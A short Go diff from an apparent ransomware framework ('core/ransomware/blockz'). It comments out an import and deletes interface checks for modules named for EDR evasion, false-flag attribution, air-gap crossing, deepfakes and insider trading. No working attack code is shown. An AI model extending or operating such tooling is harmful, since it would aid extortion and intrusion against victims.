@@ -2,7 +2,7 @@ package agent
 
 import (
 	"context"
-	"fmt"
+	// "fmt"
 
 	"github.com/ruby570bocadito/x404x/core/ransomware/blockz"
 )
@@ -196,14 +196,3 @@ func (m *BlockZFinancialModule) Execute(ctx context.Context, agentID string, par
 	return map[string]interface{}{"success": true, "positions": len(m.engine.InsiderInfo), "profit": m.engine.ProfitEstimate}, nil
 }
 
-var _ Module = (*BlockZModule)(nil)
-var _ Module = (*BlockZGeneticModule)(nil)
-var _ Module = (*BlockZDeepfakeModule)(nil)
-var _ Module = (*BlockZMedicalModule)(nil)
-var _ Module = (*BlockZDeadManModule)(nil)
-var _ Module = (*BlockZEDRModule)(nil)
-var _ Module = (*BlockZFalseFlagModule)(nil)
-var _ Module = (*BlockZQuantumModule)(nil)
-var _ Module = (*BlockZAirGapModule)(nil)
-var _ Module = (*BlockZIoTChainModule)(nil)
-var _ Module = (*BlockZFinancialModule)(nil)
